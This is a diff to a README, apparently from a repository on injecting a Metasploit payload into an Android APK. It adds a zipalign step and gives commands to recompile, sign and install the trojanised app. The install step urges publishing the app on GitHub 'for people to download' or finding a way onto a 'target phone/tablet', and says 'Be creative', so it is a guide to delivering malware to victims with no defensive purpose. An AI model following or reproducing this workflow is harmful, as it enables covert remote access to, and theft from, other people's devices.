@@ -9,6 +9,7 @@ This repository documents the technical process of injecting a Metasploit payloa
 Ensure you have the following tools installed and available in your system path:
 * **Metasploit Framework** (`msfvenom`, `msfconsole`)
 * **Apktool**
+* **Zipalign**
 * **Java Development Kit** (`keytool`, `apksigner`)
 * **Android Debug Bridge** (`adb`)
 
@@ -44,6 +45,7 @@ ctrl + o then ENTER to save, ctrl + x to exit.
 
 ### 3. Recompile the APK
 ```bash
+cd ..
 apktool b example_folder payload_example.apk
 ```
 ---
@@ -53,19 +55,22 @@ apktool b example_folder payload_example.apk
 Android environments sometimes reject unsigned applications. Create a development keystore and apply it using standard cryptographic schemas.
 
 ```bash
+# cd to where new apk is saved (possibly /example_folder/dist/)
+zipalign -v -p 4 payload_example.apk aligned_example.apk
+
 # Generate a development keystore
 keytool -genkey -v -keystore my-release-key.jks -keyalg RSA -keysize 2048 -validity 10000 -alias my-alias
 
 # Sign the recompiled APK
-apksigner sign --ks my-release-key.jks --out signed_example.apk payload_example.apk
+apksigner sign --ks my-release-key.jks --out signed_example.apk aligned_example.apk
 ```
 ---
 
 ## Step 4: Installing
 
-Install onto phone using ADB or make app release on github for people to download or find a way to it get onto target phone/tablet. Be creative.
+Install onto phone using ADB or make app release on github for people to download or find a way to get it onto target phone/tablet. Be creative.
 
-For ADB plug in phone and enter this :
+For ADB plug phone into computer and enter:
 ```
 adb install --bypass-low-target-sdk-block signed_example.apk
 ```
